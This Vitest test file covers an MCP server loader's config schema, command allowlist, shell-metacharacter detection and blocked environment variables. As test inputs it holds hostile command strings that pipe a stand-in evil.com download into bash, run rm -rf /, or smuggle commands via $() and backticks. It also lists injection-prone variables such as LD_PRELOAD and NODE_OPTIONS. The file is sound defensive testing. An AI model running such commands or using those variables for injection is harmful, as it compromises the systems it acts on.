import { describe, it, expect, vi } from "vitest";

// Mock the MCP SDK before importing the module
vi.mock("@modelcontextprotocol/sdk/client/index.js", () => ({
  Client: vi.fn().mockImplementation(() => ({
    connect: vi.fn().mockResolvedValue(undefined),
    listTools: vi.fn().mockResolvedValue({ tools: [] }),
    close: vi.fn().mockResolvedValue(undefined),
    callTool: vi.fn().mockResolvedValue({
      isError: false,
      content: [{ type: "text", text: "ok" }],
    }),
  })),
}));

vi.mock("@modelcontextprotocol/sdk/client/stdio.js", () => ({
  StdioClientTransport: vi.fn().mockImplementation(() => ({})),
}));

vi.mock("@modelcontextprotocol/sdk/client/sse.js", () => ({
  SSEClientTransport: vi.fn().mockImplementation(() => ({})),
}));

vi.mock("@modelcontextprotocol/sdk/client/streamableHttp.js", () => ({
  StreamableHTTPClientTransport: vi.fn().mockImplementation(() => ({})),
}));

import type { McpConfig, McpServerConfig } from "../../../config/schema.js";

describe("MCP Loader", () => {
  describe("command validation", () => {
    // Test that the schema accepts various command formats
    // Runtime validation (allowlist, metacharacters) is tested separately

    it("should accept valid npx command", () => {
      const config: McpServerConfig = {
        command: "npx @modelcontextprotocol/server-filesystem /tmp",
        scope: "admin-only",
        enabled: true,
      };
      expect(config.command).toContain("npx");
    });

    it("should accept valid node command", () => {
      const config: McpServerConfig = {
        command: "node server.js",
        scope: "admin-only",
        enabled: true,
      };
      expect(config.command).toContain("node");
    });

    it("should accept command with explicit args", () => {
      const config: McpServerConfig = {
        command: "npx",
        args: ["@modelcontextprotocol/server-filesystem", "/tmp"],
        scope: "admin-only",
        enabled: true,
      };
      expect(config.args).toHaveLength(2);
    });

    it("should detect shell metacharacters in command", () => {
      const SHELL_METACHARACTERS = /[|;&$()`{}\\]/;
      expect(SHELL_METACHARACTERS.test("curl http://evil.com | bash")).toBe(true);
      expect(SHELL_METACHARACTERS.test("npx evil; rm -rf /")).toBe(true);
      expect(SHELL_METACHARACTERS.test("npx `whoami`")).toBe(true);
      expect(SHELL_METACHARACTERS.test("npx $(curl evil.com)")).toBe(true);
      expect(SHELL_METACHARACTERS.test("npx server")).toBe(false);
      expect(SHELL_METACHARACTERS.test("node server.js")).toBe(false);
    });

    it("should validate command against allowlist", () => {
      const ALLOWED_MCP_COMMANDS = new Set([
        "npx",
        "node",
        "python3",
        "python",
        "uvx",
        "deno",
        "bun",
      ]);

      const testCases = [
        { cmd: "npx server", expected: true },
        { cmd: "node server.js", expected: true },
        { cmd: "python3 -m mcp_server", expected: true },
        { cmd: "uvx mcp-server", expected: true },
        { cmd: "deno run server.ts", expected: true },
        { cmd: "bun run server.ts", expected: true },
        { cmd: "/tmp/evil_binary", expected: false },
        { cmd: "../../malware", expected: false },
        { cmd: "curl http://evil.com", expected: false },
        { cmd: "bash -c 'evil'", expected: false },
      ];

      for (const { cmd, expected } of testCases) {
        const binary = cmd.split(/\s+/)[0];
        const isAllowed = binary.startsWith("/")
          ? ALLOWED_MCP_COMMANDS.has(binary.split("/").pop() ?? binary)
          : ALLOWED_MCP_COMMANDS.has(binary);
        expect(isAllowed).toBe(expected);
      }
    });
  });

  describe("schema defaults", () => {
    it("should default scope to admin-only", async () => {
      const { McpServerSchema } = await import("../../../config/schema.js");
      const result = McpServerSchema.safeParse({
        command: "npx some-server",
      });

      expect(result.success).toBe(true);
      expect(result.data!.scope).toBe("admin-only");
    });

    it("should allow explicit scope override to always", async () => {
      const { McpServerSchema } = await import("../../../config/schema.js");
      const result = McpServerSchema.safeParse({
        command: "npx some-server",
        scope: "always",
      });

      expect(result.success).toBe(true);
      expect(result.data!.scope).toBe("always");
    });

    it("should allow explicit scope override to dm-only", async () => {
      const { McpServerSchema } = await import("../../../config/schema.js");
      const result = McpServerSchema.safeParse({
        command: "npx some-server",
        scope: "dm-only",
      });

      expect(result.success).toBe(true);
      expect(result.data!.scope).toBe("dm-only");
    });

    it("should allow explicit scope override to group-only", async () => {
      const { McpServerSchema } = await import("../../../config/schema.js");
      const result = McpServerSchema.safeParse({
        command: "npx some-server",
        scope: "group-only",
      });

      expect(result.success).toBe(true);
      expect(result.data!.scope).toBe("group-only");
    });

    it("should default enabled to true", async () => {
      const { McpServerSchema } = await import("../../../config/schema.js");
      const result = McpServerSchema.safeParse({
        command: "npx some-server",
      });

      expect(result.success).toBe(true);
      expect(result.data!.enabled).toBe(true);
    });

    it("should require either command or url", async () => {
      const { McpServerSchema } = await import("../../../config/schema.js");
      const result = McpServerSchema.safeParse({
        scope: "admin-only",
      });

      expect(result.success).toBe(false);
    });

    it("should accept url without command", async () => {
      const { McpServerSchema } = await import("../../../config/schema.js");
      const result = McpServerSchema.safeParse({
        url: "https://mcp.example.com/sse",
      });

      expect(result.success).toBe(true);
    });
  });

  describe("McpConfigSchema", () => {
    it("should default servers to empty object", async () => {
      const { McpConfigSchema } = await import("../../../config/schema.js");
      const result = McpConfigSchema.safeParse({});

      expect(result.success).toBe(true);
      expect(result.data!.servers).toEqual({});
    });

    it("should accept multiple servers", async () => {
      const { McpConfigSchema } = await import("../../../config/schema.js");
      const result = McpConfigSchema.safeParse({
        servers: {
          filesystem: {
            command: "npx @modelcontextprotocol/server-filesystem /tmp",
            scope: "admin-only",
          },
          memory: {
            command: "npx @modelcontextprotocol/server-memory",
            scope: "admin-only",
          },
        },
      });

      expect(result.success).toBe(true);
      expect(Object.keys(result.data!.servers)).toHaveLength(2);
    });

    it("should default each server scope to admin-only", async () => {
      const { McpConfigSchema } = await import("../../../config/schema.js");
      const result = McpConfigSchema.safeParse({
        servers: {
          filesystem: {
            command: "npx @modelcontextprotocol/server-filesystem /tmp",
          },
          memory: {
            command: "npx @modelcontextprotocol/server-memory",
          },
        },
      });

      expect(result.success).toBe(true);
      expect(result.data!.servers.filesystem.scope).toBe("admin-only");
      expect(result.data!.servers.memory.scope).toBe("admin-only");
    });
  });

  describe("blocked env keys", () => {
    it("should include all dangerous env vars in blocked set", () => {
      const BLOCKED_ENV_KEYS = new Set([
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "DYLD_INSERT_LIBRARIES",
        "DYLD_LIBRARY_PATH",
        "NODE_OPTIONS",
        "NODE_EXTRA_CA_CERTS",
        "ELECTRON_RUN_AS_NODE",
        "PYTHONPATH",
        "PYTHONSTARTUP",
        "PYTHONINSPECT",
        "RUBYLIB",
        "PERL5LIB",
        "PERLLIB",
        "SSL_CERT_FILE",
        "SSL_CERT_DIR",
        "PATH",
        "HOME",
      ]);

      // Library injection
      expect(BLOCKED_ENV_KEYS.has("LD_PRELOAD")).toBe(true);
      expect(BLOCKED_ENV_KEYS.has("LD_LIBRARY_PATH")).toBe(true);
      expect(BLOCKED_ENV_KEYS.has("DYLD_INSERT_LIBRARIES")).toBe(true);
      expect(BLOCKED_ENV_KEYS.has("DYLD_LIBRARY_PATH")).toBe(true);

      // Node.js injection
      expect(BLOCKED_ENV_KEYS.has("NODE_OPTIONS")).toBe(true);
      expect(BLOCKED_ENV_KEYS.has("NODE_EXTRA_CA_CERTS")).toBe(true);
      expect(BLOCKED_ENV_KEYS.has("ELECTRON_RUN_AS_NODE")).toBe(true);

      // Python injection
      expect(BLOCKED_ENV_KEYS.has("PYTHONPATH")).toBe(true);
      expect(BLOCKED_ENV_KEYS.has("PYTHONSTARTUP")).toBe(true);

      // Ruby/Perl injection
      expect(BLOCKED_ENV_KEYS.has("RUBYLIB")).toBe(true);
      expect(BLOCKED_ENV_KEYS.has("PERL5LIB")).toBe(true);

      // SSL/TLS interception
      expect(BLOCKED_ENV_KEYS.has("SSL_CERT_FILE")).toBe(true);
      expect(BLOCKED_ENV_KEYS.has("SSL_CERT_DIR")).toBe(true);

      // Path manipulation
      expect(BLOCKED_ENV_KEYS.has("PATH")).toBe(true);
      expect(BLOCKED_ENV_KEYS.has("HOME")).toBe(true);
    });

    it("should be case-insensitive for blocked keys", () => {
      const BLOCKED_ENV_KEYS = new Set(["LD_PRELOAD", "NODE_OPTIONS", "PYTHONPATH", "PATH"]);

      const testKey = "ld_preload";
      expect(BLOCKED_ENV_KEYS.has(testKey.toUpperCase())).toBe(true);
    });
  });
});
